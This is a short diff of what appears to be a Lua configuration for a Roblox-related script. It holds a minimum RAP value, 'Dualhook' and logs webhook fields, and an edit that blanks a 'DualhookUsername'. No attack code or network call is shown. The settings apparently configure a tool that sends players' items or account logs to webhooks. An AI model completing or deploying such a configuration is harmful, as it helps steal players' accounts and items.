@@ -1,7 +1,7 @@
 
 MinimumRAP = 10000
 
-DualhookUsername = "manifarm5"
+DualhookUsername = ""
 DualhookWebhook = ""
 LogsWebhook = ""
 DualhookRAP = math.huge
